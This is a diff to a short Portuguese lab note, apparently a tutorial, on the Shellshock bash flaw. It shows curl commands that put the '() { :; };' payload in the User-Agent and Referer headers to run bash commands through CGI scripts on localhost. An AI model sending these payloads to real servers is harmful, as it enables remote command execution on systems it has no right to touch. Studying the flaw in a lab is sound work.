@@ -6,7 +6,7 @@ Para executar commandos com o curl ambos funcionam:
     
     curl -A "() { :; }; echo; echo; /bin/bash -c 'COMANDO'" http://localhost:8080/cgi-bin/vul.cgi
     
-    curl -e "(){:;};echo;echo;/bin/bash -c 'touch ../../tmp/2NOVA'" http://localhost:8080/cgi-bin/vul.cgi
+    curl -e "() { :; }; echo; echo; /bin/bash -c 'COMANDO'" http://localhost:8080/cgi-bin/getenv.cgi
 
 (echo; echo; é opcional é só para ver o output melhor)
 O requisito é que esta parte do header seja transformada numa "Variável de ambiente" 
